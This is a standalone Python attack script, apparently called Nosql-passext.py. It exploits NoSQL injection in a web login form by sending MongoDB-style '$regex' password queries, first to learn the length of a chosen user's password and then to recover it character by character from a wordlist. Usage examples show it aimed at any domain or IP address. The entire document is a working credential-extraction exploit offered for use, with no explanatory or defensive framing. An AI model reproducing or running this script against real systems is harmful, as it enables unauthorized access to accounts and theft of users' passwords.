import requests
import sys
print("=========================!!!No SQL!!==================================")
if len(sys.argv) < 4:
    print ("""
    Use Example : python Nosql-passext.py DN user List
    DN -> ex: test.com |OR| <Target-IP>
    ex: python Nosql-passext.py example.me pedro alphabets-nums.txt
        python Nosql-passext.py 192.168.1.10 test alphabets-nums.txt
    """)
else:
    DN = sys.argv[1]
    user = sys.argv[2]
    List = sys.argv[3]
    def Password_length():
        i = 0
        length = 0
        while i <= 32:
            data = {
                "user": user,
                "pass[$regex]": f"^.{{{i}}}",
                "remember": "on"
            }
            session = requests.session()
            resp = session.post(f"http://{DN}/login.php", data=data, allow_redirects=False)
            location = resp.headers['Location']
            if location == "/?err=1":
                length = i - 1
                break
            i+=1
        return length
    length_of_pass = Password_length()

    def traverse_array(i, alpha):
        st = ['^']
        j = 0 
        while j < length_of_pass:
            st += "."
            j+=1
        for el in range(1, length_of_pass+1):
            if el == i:
                st[el] = alpha
        return ''.join(st)

    def req(i, alpha, user):
        passw = traverse_array(i, alpha)
        data = {
            "user": user,
            "pass[$regex]": passw,
            "remember": "on"
        }
        session = requests.session()
        resp = session.post(f"http://{DN}/login.php", data=data, allow_redirects=False)
        return resp.headers['Location']

    def main():
        password = ''
        with open(List, "r") as file:
            for i in range(1, length_of_pass + 1):
                file.seek(0)
                for line in file:
                    element = line.strip()
                    location = req(i, element, user)
                    if location != "/?err=1":
                        print(element, end="")
                        password += element
                        break

        if password:
            print(f"\nPassword Length:{length_of_pass} \nThe password is : {password}")
        else:
            print("Password Not found!!")
    if __name__ == "__main__":
        main()
